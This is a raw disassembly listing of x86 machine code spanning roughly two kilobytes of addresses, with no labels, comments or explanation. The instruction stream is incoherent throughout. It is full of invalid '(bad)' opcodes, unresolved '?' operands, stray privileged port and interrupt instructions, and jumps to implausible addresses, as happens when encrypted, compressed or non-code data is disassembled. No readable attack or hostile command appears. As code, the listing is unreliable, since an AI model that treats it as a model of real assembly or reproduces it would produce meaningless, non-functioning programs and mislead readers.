  40b97f:	popa   
  40b980:	jmp    FWORD PTR [ecx-0x6]
  40b983:	mov    ebx,0xf444
	...
  40b994:	add    BYTE PTR [edx-0x46],cl
  40b997:	test   ah,dh
  40b999:	adc    eax,0xd50fece
  40b99e:	push   esp
  40b99f:	idiv   edi
  40b9a1:	xchg   edi,eax
  40b9a2:	int    0xe7
  40b9a4:	imul   edi,DWORD PTR [ecx+0x6],0x0
  40b9a8:	or     ecx,DWORD PTR [edx]
  40b9aa:	push   ebx
  40b9ab:	add    al,0xe9
  40b9ad:	cmp    al,BYTE PTR [edi]
  40b9af:	add    BYTE PTR [eax],al
  40b9b1:	and    dh,BYTE PTR [ecx-0x3245bed9]
  40b9b7:	je     0x40b9c5
  40b9b9:	sar    BYTE PTR [ebx+esi*4-0x75893201],cl
  40b9c0:	ror    BYTE PTR [edi],1
  40b9c2:	ret    
  40b9c3:	repz neg ebp
  40b9c6:	int    0x4f
  40b9c8:	push   edx
  40b9c9:	repnz dec esp
  40b9cb:	mov    bl,0xff
  40b9cd:	or     eax,0x15f084bf
  40b9d2:	int    0xfe
  40b9d4:	call   0x40501f
  40b9d9:	(bad)  
  40b9db:	xlat   BYTE PTR ds:[ebx]
  40b9dc:	test   DWORD PTR ds:0x9d684fcd,0x1d00410e
  40b9e6:	xchg   ebx,eax
  40b9e7:	lock neg DWORD PTR [ebp+0x6535fecd]
  40b9ee:	push   ds
  40b9ef:	inc    ecx
  40b9f0:	add    BYTE PTR [edx+0x7dffb2fd],ah
  40b9f6:	mov    edi,0xe484
	...
  40ba07:	add    BYTE PTR [ebp-0x33],dl
  40ba0a:	(bad)  
  40ba0b:	push   0x63
  40ba0d:	sub    al,0xdb
  40ba0f:	ins    BYTE PTR es:[edi],dx
  40ba10:	imul   ebp,DWORD PTR [ebp+0x3],0xffffffff
  40ba14:	out    dx,al
  40ba15:	cmp    ecx,DWORD PTR [edi-0x1]
  40ba18:	sbb    al,0x43
  40ba1a:	or     eax,0x36d4a27
  40ba1f:	call   0xff88b8f6
  40ba24:	fidiv  DWORD PTR [eax+0x62fcf757]
  40ba2a:	(bad)  
  40ba2c:	jl     0x40ba10
  40ba2e:	or     eax,DWORD PTR [ecx+0x63]
  40ba31:	push   ebx
  40ba32:	xchg   ecx,eax
  40ba33:	lock in al,dx
  40ba35:	dec    edx
  40ba36:	inc    edi
  40ba37:	call   DWORD PTR [esi+0x63411d0b]
  40ba3d:	inc    esp
  40ba3e:	jae    0x40b9f3
  40ba40:	int3   
  40ba41:	jb     0x40bac0
  40ba43:	test   DWORD PTR [ebx-0x1100b85e],edi
  40ba49:	test   al,0x27
  40ba4b:	div    DWORD PTR [edx+ebx*4+0x53db67b4]
  40ba52:	(bad)  
  40ba53:	jmp    DWORD PTR [ebp-0x6308ac00]
  40ba59:	ret    0x3546
  40ba5c:	cmp    al,0x45
  40ba5e:	(bad)  
  40ba5f:	inc    DWORD PTR [ebx+edi*1+0x3684ff92]
  40ba66:	inc    ebx
  40ba67:	je     0x40bac3
  40ba69:	scas   eax,DWORD PTR es:[edi]
  40ba6a:	mov    ah,bl
	...
  40ba78:	add    BYTE PTR [eax],al
  40ba7a:	add    BYTE PTR [edx+ebx*8+0x46],ch
  40ba7e:	add    al,0xf6
  40ba80:	cmp    eax,DWORD PTR [esi+0x30]
  40ba83:	aam    0xb0
  40ba85:	arpl   di,si
  40ba87:	pop    esp
  40ba88:	add    BYTE PTR [edi+eiz*8-0xb9416a],dh
  40ba8f:	cmp    BYTE PTR [ebx-0x6],bl
  40ba92:	mov    edi,0xb3ef05cf
  40ba97:	inc    esp
  40ba98:	neg    DWORD PTR [eax+0x47]
  40ba9b:	xor    al,0x49
  40ba9d:	ins    BYTE PTR es:[edi],dx
  40ba9e:	fs xor al,0x41
  40baa1:	push   cs
  40baa2:	icebp  
  40baa3:	and    al,0x41
  40baa5:	jmp    0xf66a992c
  40baaa:	inc    esi
  40baab:	adc    al,0x6
  40baad:	jge    0x40ba74
  40baaf:	loope  0x40ba33
  40bab1:	std    
  40bab2:	dec    esi
  40bab3:	add    al,0x41
  40bab5:	jmp    0x9cc53289
  40baba:	pop    ebx
  40babb:	in     al,dx
  40babc:	inc    eax
  40babd:	(bad)  
  40babe:	add    esi,DWORD PTR [edi-0x4f]
  40bac1:	inc    edx
  40bac2:	add    al,0xd6
  40bac4:	mov    ah,BYTE PTR [ecx+0x1940dc4e]
  40baca:	inc    edi
  40bacb:	push   cs
  40bacc:	sub    bh,BYTE PTR [esi+0x1b2dcc46]
  40bad2:	xor    esp,eax
  40bad4:	inc    eax
  40bad5:	repnz inc ebx
  40bad7:	aaa    
  40bad8:	fldcw  WORD PTR [ecx-0x78]
  40badb:	fwait
  40badc:	cmp    BYTE PTR [esi+0x46],dl
	...
  40baee:	arpl   WORD PTR [ecx+0x40a4dc21],di
  40baf4:	xchg   esi,eax
  40baf5:	test   DWORD PTR [edx+edi*4+0x70fc5bf0],ebx
  40bafc:	jbe    0x40bb44
  40bafe:	mov    WORD PTR [edx+0x7d],?
  40bb01:	dec    esi
  40bb02:	test   BYTE PTR [eax+0x66],al
  40bb05:	shl    BYTE PTR [ebp+ebp*1-0x5e],1
  40bb09:	xchg   edi,eax
  40bb0a:	je     0x40bb4c
  40bb0c:	push   esi
  40bb0d:	nop
  40bb0e:	jnp    0x40bb48
  40bb10:	dec    esi
  40bb11:	inc    esi
  40bb12:	fs mov edx,0x710e5bf0
  40bb18:	ds inc esi
  40bb1a:	push   esp
  40bb1b:	jp     0x40bb1d
  40bb1d:	adc    DWORD PTR [ebp-0xcd100c0],ebx
  40bb23:	sub    bh,dh
  40bb25:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40bb27:	inc    eax
  40bb28:	jne    0x40bb1b
  40bb2a:	cwde   
  40bb2b:	mov    dl,0xab
  40bb2d:	push   ss
  40bb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb2f:	inc    eax
  40bb30:	mov    ch,0x9
  40bb32:	xchg   ebp,eax
  40bb33:	inc    eax
  40bb34:	inc    DWORD PTR [esi]
  40bb36:	xor    ecx,DWORD PTR [eax]
  40bb38:	call   0xff80a80d
  40bb3d:	neg    ah
  40bb3f:	sub    bh,dh
  40bb41:	out    dx,al
  40bb42:	sahf   
  40bb43:	sub    eax,0x40a69695
  40bb48:	call   DWORD PTR [ebx+ebx*4-0x702900c8]
  40bb4f:	mov    ebp,DWORD PTR [edi+0xce]
	...
  40bb61:	sahf   
  40bb62:	inc    eax
  40bb63:	mov    ch,0xd1
  40bb65:	cs inc eax
  40bb67:	call   ecx
  40bb69:	sahf   
  40bb6a:	outs   dx,BYTE PTR ds:[esi]
  40bb6b:	push   DWORD PTR [esi-0x490f85da]
  40bb71:	push   ds
  40bb72:	inc    eax
  40bb73:	call   0xff809195
  40bb78:	sahf   
  40bb79:	hlt    
  40bb7a:	aaa    
  40bb7b:	jmp    0xff80e0ab
  40bb80:	mov    ss,WORD PTR [ebx+edi*1+0x4e047e8]
  40bb87:	add    BYTE PTR [eax+0x1c000d21],dh
  40bb8d:	or     dh,BYTE PTR [ecx]
  40bb8f:	and    DWORD PTR [ebp-0xa8abfcd],0x18
  40bb96:	xlat   BYTE PTR ds:[ebx]
  40bb97:	jg     0x40bb82
  40bb99:	pusha  
  40bb9a:	mov    es,WORD PTR [ebp+0x51]
  40bb9d:	es mov edx,0x6ebd41f7
  40bba3:	inc    DWORD PTR [eax]
  40bba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bba6:	mov    edx,0x4e95fc44
  40bbab:	sti    
  40bbac:	dec    DWORD PTR [edi]
  40bbae:	retf   
  40bbaf:	(bad)  
  40bbb0:	jne    0x40bbd8
  40bbb2:	fist   DWORD PTR [esi]
  40bbb4:	mov    ebx,0xc00ac885
  40bbb9:	into   
  40bbba:	or     BYTE PTR [ecx-0xa4b1bb],cl
  40bbc0:	mov    edi,?
  40bbc2:	into   
  40bbc3:	dec    edi
  40bbc4:	inc    DWORD PTR [eax]
	...
  40bbd2:	add    BYTE PTR [eax],al
  40bbd4:	lahf   
  40bbd5:	(bad)  
  40bbd6:	out    0x7b,eax
  40bbd8:	outs   dx,BYTE PTR ds:[esi]
  40bbd9:	enter  0xbfe,0x3a
  40bbdd:	push   ebp
  40bbde:	sub    BYTE PTR [eax-0x6],ch
  40bbe1:	xor    ch,dh
  40bbe3:	mov    esi,0xe8075005
  40bbe8:	jecxz  0x40bb87
  40bbea:	(bad)  
  40bbeb:	call   DWORD PTR ds:0x8ffff750
  40bbf1:	cmp    eax,0xdad275fe
  40bbf6:	shr    BYTE PTR [ebx+0x75feca15],0xe
  40bbfd:	retf   0xfc74
  40bc00:	cmc    
  40bc01:	dec    edi
  40bc02:	pop    es
  40bc03:	call   0x405921
  40bc08:	aad    0x4f
  40bc0a:	sti    
  40bc0b:	call   0x4054f6
  40bc10:	add    eax,ebp
  40bc12:	pop    es
  40bc13:	add    BYTE PTR [edi-0x44],bh
  40bc16:	jmp    0x40bb9b
  40bc18:	mov    esi,0x8fff55da
  40bc1d:	ss out 0xad,eax
  40bc20:	dec    ecx
  40bc21:	leave  
  40bc22:	dec    BYTE PTR [ebx]
  40bc24:	dec    edx
  40bc25:	dec    edi
  40bc26:	add    al,0x5e
  40bc28:	xor    eax,esp
  40bc2a:	pop    es
  40bc2b:	add    BYTE PTR [ebx-0x57],ah
  40bc2e:	mov    ebp,0xcdcf13ef
  40bc33:	or     ecx,DWORD PTR [ebx+0x67]
  40bc36:	(bad)  
  40bc37:	inc    DWORD PTR [eax]
	...
  40bc45:	add    BYTE PTR [eax],al
  40bc47:	push   esp
  40bc48:	xor    eax,DWORD PTR [ebx+0xf]
  40bc4b:	out    0xd1,eax
  40bc4d:	add    al,BYTE PTR [eax]
  40bc4f:	arpl   di,bp
  40bc51:	int    0xfb
  40bc53:	dec    ebx
  40bc54:	repz xchg esp,eax
  40bc56:	push   DWORD PTR [esi*4-0x5ed31443]
  40bc5d:	inc    edi
  40bc5e:	jmp    FWORD PTR [esi+0x1b754340]
  40bc64:	adc    al,0x52
  40bc66:	scas   al,BYTE PTR es:[edi]
  40bc67:	adc    al,0x3f
  40bc69:	ja     0x40bce0
  40bc6b:	inc    DWORD PTR [edx]
  40bc6d:	mov    edx,0xc2742267
  40bc72:	call   DWORD PTR [esi+0x6380c554]
  40bc78:	sub    al,0xe
  40bc7a:	shl    BYTE PTR [esi+0x2a],0x2e
  40bc7e:	cmp    eax,0xc0ac5bd8
  40bc83:	fwait
  40bc84:	in     eax,dx
  40bc85:	add    ebp,eax
  40bc87:	fdivp  st(6),st
  40bc89:	add    eax,DWORD PTR [eax]
  40bc8b:	pusha  
  40bc8c:	jl     0x40bc1b
  40bc8e:	jne    0x40bc4b
  40bc90:	ret    
  40bc91:	push   ebx
  40bc92:	cmp    BYTE PTR [edx],ah
  40bc94:	sub    al,0xd9
  40bc96:	out    0x54,eax
  40bc98:	lods   eax,DWORD PTR ds:[esi]
  40bc99:	add    eax,DWORD PTR [eax]
  40bc9b:	pop    eax
  40bc9c:	ins    BYTE PTR es:[edi],dx
  40bc9d:	mov    ecx,0x8d32b801
  40bca2:	adc    BYTE PTR [ebp+0x3150032b],ah
  40bca8:	mov    edi,0xe7b8
	...
  40bcb9:	add    BYTE PTR [eax+eax*2-0x527517f5],cl
  40bcc0:	inc    edx
  40bcc1:	call   FWORD PTR [ecx]
  40bcc3:	add    eax,0x85538bc1
  40bcc8:	pop    ds
  40bcc9:	add    al,0xf6
  40bccb:	jb     0x40bc8e
  40bccd:	add    al,0x53
  40bccf:	pop    DWORD PTR cs:[ebx-0x2a]
  40bcd3:	or     eax,0x3d095051
  40bcd8:	ds inc ebx
  40bcda:	(bad)  
  40bcdb:	cmp    DWORD PTR [esi],esi
  40bcdd:	mov    ecx,0xbb43d38
  40bce2:	dec    ebx
  40bce3:	xor    dl,BYTE PTR [ebx+0x43]
  40bce6:	xor    al,0x3d
  40bce8:	xchg   esp,eax
  40bce9:	das    
  40bcea:	cmp    ebp,ebx
  40bcec:	inc    esi
  40bced:	inc    ebx
  40bcee:	and    al,0x8b
  40bcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf1:	xor    esi,DWORD PTR [ebx+0x14779a2d]
  40bcf7:	cmp    eax,0x4ead0412
  40bcfc:	sub    ecx,DWORD PTR [ebx+eiz*2]
  40bcff:	shl    BYTE PTR [ecx+0x30],cl
  40bd02:	loopne 0x40bd45
  40bd04:	in     eax,0xad
  40bd06:	hlt    
  40bd07:	scas   al,BYTE PTR es:[edi]
  40bd08:	repz inc edx
  40bd0a:	jbe    0x40bd19
  40bd0c:	rol    esi,0xb9
  40bd0f:	cmp    al,0xce
  40bd11:	mov    WORD PTR [esi],fs
  40bd13:	cmp    DWORD PTR [ecx-0x6f],edx
  40bd16:	fwait
  40bd17:	(bad)  
  40bd18:	call   0xc14e135f
  40bd1d:	push   0x0
	...
  40bd2b:	add    BYTE PTR [eax],al
  40bd2d:	(bad)  
  40bd2e:	cmp    al,0xae
  40bd30:	lods   eax,DWORD PTR ds:[esi]
  40bd31:	mov    esp,0x23fb8da4
  40bd36:	add    eax,0xc66b5711
  40bd3b:	call   0xc0252b82
  40bd40:	les    ebx,FWORD PTR [esp+0x3c947385]
  40bd47:	repnz inc ebx
  40bd49:	pop    ss
  40bd4a:	pop    ds
  40bd4b:	add    BYTE PTR [ecx],al
  40bd4d:	or     ebp,edi
  40bd4f:	inc    eax
  40bd50:	jmp    0x9908e1e5
  40bd55:	and    DWORD PTR [eax+edx*2],edi
  40bd58:	mov    ecx,0x4107b221
  40bd5d:	cmp    eax,0x884eff3b
  40bd62:	inc    ebx
  40bd63:	lods   eax,DWORD PTR ds:[esi]
  40bd64:	inc    esi
  40bd65:	mov    eax,ds:0x725119af
  40bd6a:	ja     0x40bd6b
  40bd6c:	ss push ebp
  40bd6e:	inc    ebp
  40bd6f:	je     0x40bd75
  40bd71:	movd   mm7,DWORD PTR [eax]
  40bd74:	test   al,0x60
  40bd76:	aad    0xe7
  40bd78:	dec    edx
  40bd79:	mov    bh,0x3c
  40bd7b:	inc    DWORD PTR [ecx-0x16bf0256]
  40bd81:	xor    BYTE PTR [eax+ebx*4],ah
  40bd84:	cmp    BYTE PTR [ecx-0x5e66afc4],ah
  40bd8a:	mov    dl,0x7
  40bd8c:	add    DWORD PTR [ebp+0xeeff3b],ecx
	...
  40bd9e:	add    BYTE PTR [eax],al
  40bda0:	dec    ecx
  40bda1:	xchg   ebx,eax
  40bda2:	lods   eax,DWORD PTR ds:[esi]
  40bda3:	out    0xa2,al
  40bda5:	scas   eax,DWORD PTR es:[edi]
  40bda6:	sbb    edx,ecx
  40bda8:	xor    DWORD PTR [esi-0x1],0x744556d6
  40bdaf:	add    al,0xf
  40bdb1:	outs   dx,BYTE PTR ds:[esi]
  40bdb2:	cmp    BYTE PTR [eax],ch
  40bdb4:	pop    edi
  40bdb5:	aad    0xe7
  40bdb7:	cmp    dl,BYTE PTR [eax+0x3c]
  40bdba:	inc    DWORD PTR [ecx+0x49]
  40bdbd:	std    
  40bdbe:	inc    eax
  40bdbf:	jmp    0x58a8e154
  40bdc4:	and    bh,BYTE PTR [eax+edx*2]
  40bdc7:	cmp    DWORD PTR [edx],esp
  40bdc9:	mov    dl,0x7
  40bdcb:	sbb    esi,0x4f8eff3a
  40bdd1:	mov    ds:0xc5dd00ac,eax
  40bdd6:	imul   esp,DWORD PTR [ebx],0xffb0b6f2
  40bddc:	or     eax,0xa774c00a
  40bde1:	outs   dx,DWORD PTR ds:[esi]
  40bde2:	test   eax,0x5007cb38
  40bde7:	call   0x3f74a5
  40bdec:	mov    ds:0x4a4137bd,al
  40bdf1:	push   edi
  40bdf2:	out    0x38,eax
  40bdf4:	fcmovnb st,st(4)
  40bdf6:	(bad)  
  40bdf7:	push   eax
  40bdf8:	jmp    0xfd50:0xa20874c5
  40bdff:	dec    DWORD PTR [ebp+0xad35e9]
	...
  40be11:	add    BYTE PTR [eax],al
  40be13:	jge    0x40bdd9
  40be15:	(bad)  
  40be16:	jne    0x40be66
  40be18:	les    esi,FWORD PTR [eax+ecx*1+0x62]
  40be1c:	scas   al,BYTE PTR es:[edi]
  40be1d:	test   eax,0xc1ce6dff
  40be22:	add    al,0xa
  40be24:	push   esp
  40be25:	mov    ch,ah
  40be27:	jnp    0x40bdf6
  40be29:	fcomi  st,st(7)
  40be2b:	or     eax,0xe458cc6
  40be30:	push   edi
  40be31:	(bad)  
  40be32:	jne    0x40be2e
  40be34:	lds    esi,FWORD PTR [esp+ecx*1+0x12]
  40be38:	jbe    0x40beb8
  40be3a:	add    dl,bh
  40be3c:	or     eax,eax
  40be3e:	cmova  eax,DWORD PTR [ecx+eax*1+0x44cdca00]
  40be46:	clc    
  40be47:	mov    edx,0xf5000006
  40be4c:	inc    ebx
  40be4d:	repz inc ebp
  40be50:	push   es
  40be51:	add    BYTE PTR [edx-0x36],ch
  40be54:	push   0x68ba69ff
  40be59:	dec    DWORD PTR [ebx+eiz*2-0x11afc817]
  40be60:	mov    eax,ds:0x8394f736
  40be65:	sar    esi,cl
  40be67:	push   ss
  40be68:	test   BYTE PTR [eax+0x75],al
  40be6b:	xchg   DWORD PTR [edx+eax*8+0xc2c637e],eax
  40be72:	shr    bh,0x28
  40be75:	sub    al,BYTE PTR [ecx+0x0]
	...
  40be83:	add    BYTE PTR [eax],al
  40be85:	add    BYTE PTR [edx+0x2c],ah
  40be88:	add    ebp,DWORD PTR [eax-0x35]
  40be8b:	add    al,0xc3
  40be8d:	call   FWORD PTR [ebp+0x51]
  40be90:	adc    ebp,eax
  40be92:	mov    edi,0xb3ff3fbc
  40be97:	mov    bh,0x52
  40be99:	(bad)  
  40be9a:	fdivrp st(7),st
  40be9c:	aaa    
  40be9d:	(bad)  
  40be9e:	cmp    al,0x9c
  40bea0:	aad    0xe7
  40bea2:	(bad)  
  40bea3:	fdivr  QWORD PTR [edi]
  40bea5:	(bad)  
  40bea6:	fisub  DWORD PTR [eax+0x1324f732]
  40beac:	sub    ebp,DWORD PTR [edx+0x6a400acf]
  40beb2:	arpl   WORD PTR [eax+ecx*1+0x402ca239],dx
  40beb9:	mov    ch,0x13
  40bebb:	cmp    edi,DWORD PTR [edi]
  40bebd:	(bad)  
  40bebe:	cld    
  40bebf:	mov    al,0xe
  40bec1:	call   0xff80518c
  40bec6:	fisub  DWORD PTR [eax+0x52e4f727]
  40becc:	stos   BYTE PTR es:[edi],al
  40becd:	inc    DWORD PTR [esp+edi*1-0x4]
  40bed1:	inc    eax
  40bed2:	arpl   WORD PTR [ebx+0x79],ax
  40bed5:	lock aam 0x7a
  40bed8:	aas    
  40bed9:	dec    DWORD PTR [esi+0x20]
  40bedc:	sub    edx,DWORD PTR [edx-0x76c094f4]
  40bee2:	fiadd  WORD PTR [ecx+ecx*4]
  40bee5:	aaa    
  40bee6:	lods   al,BYTE PTR ds:[esi]
  40bee7:	cmp    DWORD PTR [ebx],edx
  40bee9:	add    al,0x0
	...
  40bef7:	add    BYTE PTR [eax],al
  40bef9:	cmp    esi,DWORD PTR [edx]
  40befb:	rol    esp,1
  40befd:	pushf  
  40befe:	cmp    dl,BYTE PTR [esp+esi*1-0x74]
  40bf02:	cmp    DWORD PTR [esi-0x6ef6e9c1],eax
  40bf08:	mov    bh,0xb5
  40bf0a:	cmp    DWORD PTR [esi-0x73],esi
  40bf0d:	out    0x28,al
  40bf0f:	jbe    0x40bf50
  40bf11:	je     0x40bec1
  40bf13:	call   0xa83d2dc3
  40bf18:	add    esp,DWORD PTR [edi+ebp*2+0x59]
  40bf1c:	aaa    
  40bf1d:	pop    esp
  40bf1e:	cmp    DWORD PTR [esi-0x47],ecx
  40bf21:	push   0x4c6ea52d
  40bf26:	cmp    DWORD PTR [eax-0x77],esi
  40bf29:	cmp    esi,DWORD PTR [ecx]
  40bf2b:	ss aas 
  40bf2d:	leave  
  40bf2e:	add    eax,0xc67a19c1
  40bf33:	call   0x1676b576
  40bf38:	aas    
  40bf39:	and    al,0x39
  40bf3b:	pushf  
  40bf3c:	ud2    
  40bf3e:	(bad)  
  40bf3f:	cmp    eax,0x6c8f143f
  40bf44:	pusha  
  40bf45:	adc    al,0x39
  40bf47:	inc    BYTE PTR [edx+0x3efe21c6]
  40bf4d:	cld    
  40bf4e:	add    eax,0x7ae00c74
  40bf53:	leave  
  40bf54:	ss in  al,dx
  40bf56:	cmp    cl,ch
  40bf58:	mov    bh,0x7f
  40bf5a:	test   BYTE PTR [edi+ebp*1+0x0],dl
	...
  40bf69:	add    BYTE PTR [eax],al
  40bf6b:	add    ah,dl
  40bf6d:	cmp    dh,cl
  40bf6f:	add    ecx,DWORD PTR [edi-0x27]
  40bf72:	imul   eax,DWORD PTR [eax+0x3ebe30bb],0x19ffb163
  40bf7c:	(bad)  
  40bf7e:	(bad)  
  40bf7f:	mov    esi,0xf1753836
  40bf84:	js     0x40bf42
  40bf86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf87:	sahf   
  40bf88:	cmp    BYTE PTR gs:[ebp-0xc7aa7b],dh
  40bf8f:	mov    ds,ebx
  40bf91:	add    al,ch
  40bf93:	mov    dh,0xf8
  40bf95:	aaa    
  40bf96:	(bad)  
  40bf97:	jle    0x40bfa4
  40bf99:	sub    eax,0x383d76f7
  40bf9e:	jne    0x40bf81
  40bfa0:	dec    eax
  40bfa1:	inc    esi
  40bfa2:	test   al,0x66
  40bfa4:	sub    eax,0x2d45b538
  40bfa9:	cmp    bh,bh
  40bfab:	push   esi
  40bfac:	sbb    eax,DWORD PTR [eax]
  40bfae:	call   0xff79884d
  40bfb3:	inc    esi
  40bfb4:	retf   
  40bfb5:	and    eax,0x38853ef7
  40bfba:	jne    0x40bf9d
  40bfbc:	mov    BYTE PTR [edx-0x58],ah
  40bfbf:	cs jne 0x40bffa
  40bfc2:	mov    ch,0x45
  40bfc4:	jne    0x40bffe
  40bfc6:	call   FWORD PTR [esi]
  40bfc8:	jmp    0x40bfc9
  40bfca:	out    0x7e,eax
  40bfcc:	mov    BYTE PTR [eax],bh
  40bfce:	dec    DWORD PTR [esi]
	...
  40bfdc:	add    BYTE PTR [eax],al
  40bfde:	add    BYTE PTR [ebx+0x4d06f721],bl
  40bfe4:	sub    eax,0x384552a1
  40bfe9:	(bad)  
  40bfea:	cmp    al,0x40
  40bfec:	xor    bh,bh
  40bfee:	out    dx,al
  40bfef:	dec    ecx
  40bff0:	(bad)  
  40bff1:	stos   DWORD PTR es:[edi],eax
  40bff2:	out    0x2e,al
  40bff4:	cmp    BYTE PTR [ebp-0xc7d133],dh
  40bffa:	shr    edx,0x6b
  40bffd:	dec    esi
  40bfff:	xchg   esi,eax
  40c000:	jb     0x40bfea
  40c002:	add    BYTE PTR ds:0x3ae8fefa,cl
  40c008:	scas   al,BYTE PTR es:[edi]
  40c009:	(bad)  
  40c00a:	push   ebp
  40c00c:	scas   eax,DWORD PTR es:[edi]
  40c00d:	fcomi  st,st(7)
  40c00f:	add    eax,0x1175e7fa
  40c014:	cli    
  40c015:	(bad)  
  40c016:	dec    DWORD PTR [edi]
  40c018:	icebp  
  40c019:	idiv   bh
  40c01b:	cmc    
  40c01c:	stc    
  40c01d:	je     0x40c02b
  40c01f:	in     eax,0x6f
  40c021:	pop    es
  40c022:	call   0x3fb9ce
  40c027:	add    eax,0xf5f7efb0
  40c02c:	stc    
  40c02d:	out    0x59,eax
  40c02f:	and    edx,edi
  40c031:	(bad)  
  40c032:	(bad)  
  40c033:	mov    edi,0x451e8fb
  40c038:	cli    
  40c039:	(bad)  
  40c03a:	(bad)  
  40c03b:	aas    
  40c03c:	mul    edi
  40c03e:	mov    ds:0xc9000327,eax
	...
  40c04f:	add    BYTE PTR [eax],al
  40c051:	add    BYTE PTR [eax+0x15],bh
  40c054:	add    BYTE PTR [ebp-0x2f],dl
  40c057:	cmc    
  40c058:	add    ah,0x76
  40c05b:	imul   edi,edi,0x69
  40c05e:	or     al,0xfa
  40c060:	je     0x40c06a
  40c062:	push   edx
  40c063:	ins    BYTE PTR es:[edi],dx
  40c064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c065:	inc    DWORD PTR [ebp-0x76]
  40c068:	inc    ebp
  40c069:	cld    
  40c06a:	loop   0x40c08a
  40c06c:	cmp    BYTE PTR [ecx+0xa],al
  40c06f:	imul   eax,DWORD PTR [ecx],0x0
  40c072:	cli    
  40c073:	cmp    bh,0x75
  40c076:	adc    ch,bl
  40c078:	idiv   ch
  40c07a:	cmc    
  40c07b:	stc    
  40c07c:	addr16 and al,0xb3
  40c07f:	inc    ebx
  40c080:	(bad)  
  40c081:	dec    BYTE PTR [edi+0x20]
  40c084:	sub    BYTE PTR [ecx-0x6],al
  40c087:	stc    
  40c088:	je     0x40c092
  40c08a:	arpl   WORD PTR [edi+eiz*1-0x3],ax
  40c08e:	aam    0x47
  40c090:	cmp    al,0x75
  40c092:	iret   
  40c093:	aas    
  40c094:	mov    dh,0x7
  40c096:	mov    ebx,0xbcff6bf6
  40c09b:	gs inc ecx
  40c09d:	add    al,0x63
  40c09f:	adc    DWORD PTR [ecx+0x5f68e2ec],ecx
  40c0a5:	mul    DWORD PTR [edi+edx*4-0x360ba72]
  40c0ac:	cmp    al,0x75
  40c0ae:	jae    0x40c037
  40c0b0:	mov    dh,0xb
  40c0b2:	jnp    0x40c09c
  40c0b4:	mov    esi,0xff
	...
  40c0c5:	test   BYTE PTR [ebx],dh
  40c0c7:	inc    ebx
  40c0c8:	(bad)  
  40c0ca:	out    dx,al
  40c0cb:	add    DWORD PTR [eax],eax
  40c0cd:	arpl   WORD PTR [edi-0x3a],bx
  40c0d0:	mul    DWORD PTR [ebx+0x2c]
  40c0d3:	add    eax,DWORD PTR [eax]
  40c0d5:	pushf  
  40c0d6:	popa   
  40c0d7:	aaa    
  40c0d8:	jmp    DWORD PTR [esp+ebp*1+0x3]
  40c0dc:	push   0x63
  40c0de:	inc    edx
  40c0df:	add    ebp,DWORD PTR [edx+0x63]
  40c0e2:	push   edx
  40c0e3:	add    ecx,DWORD PTR [ebp-0x732d0f62]
  40c0e9:	out    0xf7,al
  40c0eb:	xor    edi,edi
  40c0ed:	xor    al,0x9c
  40c0ef:	cmp    al,0x75
  40c0f1:	sub    ebx,edi
  40c0f3:	mov    ch,0xfb
  40c0f5:	cmp    ebp,DWORD PTR [esi]
  40c0f7:	mov    esi,0x43231cff
  40c0fc:	je     0x40c15c
  40c0fe:	add    eax,0x2c630182
  40c103:	stos   DWORD PTR es:[edi],eax
  40c104:	xchg   edi,eax
  40c105:	cmp    ebp,DWORD PTR [ebp+0x3]
  40c108:	push   DWORD PTR [esi+0x5c]
  40c10b:	sub    edi,DWORD PTR [ecx]
  40c10d:	lds    esp,FWORD PTR [esi]
  40c10f:	cmp    edx,DWORD PTR [eax-0x28]
  40c112:	add    al,0xb9
  40c114:	mov    esi,ebx
  40c116:	xor    dh,dl
  40c118:	cmp    ebx,esp
  40c11a:	aam    0x3a
  40c11c:	sub    al,0x8a
  40c11e:	addr16 into 
  40c120:	cmp    ebx,edx
  40c122:	jg     0x40c0dd
  40c124:	xor    eax,esp
  40c126:	xor    eax,0xbbd1
	...
  40c137:	add    BYTE PTR [edx],cl
  40c139:	ss mov dh,0xae
  40c13c:	mov    ah,0x9d
  40c13e:	inc    ebp
  40c13f:	std    
  40c140:	and    eax,DWORD PTR ds:0x2db371a6
  40c146:	sahf   
  40c147:	cmp    ebx,DWORD PTR [edi+ebp*4+0x67e12be4]
  40c14e:	mov    ?,WORD PTR [ebx]
  40c150:	fidivr DWORD PTR [edi-0x73]
  40c153:	xor    eax,DWORD PTR [ebp+esi*1-0x4df4fbed]
  40c15a:	scas   eax,DWORD PTR es:[edi]
  40c15b:	les    esi,FWORD PTR [esi+esi*1+0x34]
  40c15f:	xor    al,0x74
  40c161:	xor    eax,0x8ee3b66
  40c166:	push   ecx
  40c167:	mov    ds:0x8d56350f,eax
  40c16c:	fisub  WORD PTR ds:0xa04c3b56
  40c172:	call   0xa82f7522
  40c177:	add    edi,DWORD PTR [ebx+edi*2]
  40c17a:	cmp    DWORD PTR [ebx],esi
  40c17c:	xor    al,0x35
  40c17e:	cs mov cl,0x58
  40c181:	sbb    eax,0x352468b5
  40c186:	jo     0x40c109
  40c188:	(bad)  
  40c18a:	push   ss
  40c18b:	cmp    ecx,DWORD PTR [ecx+0x4bde8105]
  40c191:	(bad)  
  40c192:	call   0xf6768fd1
  40c197:	cmp    bh,ah
  40c199:	xor    al,0x0
  40c19b:	jl     0x40c19d
	...
  40c1a9:	add    BYTE PTR [eax],al
  40c1ab:	pop    esp
  40c1ac:	sbb    eax,0x34283c31
  40c1b1:	mov    DWORD PTR [eax+edi*1+0x3c],ebp
  40c1b5:	(bad)  
  40c1b6:	fimul  WORD PTR [esi]
  40c1b8:	xor    eax,0xc5d76967
  40c1bd:	dec    ebp
  40c1bf:	push   ebx
  40c1c0:	xor    eax,0x3489c6f7
  40c1c5:	jne    0x40c1b4
  40c1c7:	mov    BYTE PTR [ebx],bl
  40c1c9:	lods   eax,DWORD PTR ds:[esi]
  40c1ca:	mov    dh,0x79
  40c1cc:	jle    0x40c153
  40c1ce:	lea    esi,[ecx+0x34]
  40c1d1:	jmp    FWORD PTR [edx+0x2b]
  40c1d4:	sub    edi,esi
  40c1d6:	sahf   
  40c1d7:	pop    ecx
  40c1d8:	add    eax,0x72dde075
  40c1dd:	loopne 0x40c175
  40c1df:	dec    ecx
  40c1e0:	xor    al,0x0
  40c1e2:	std    
  40c1e3:	ret    
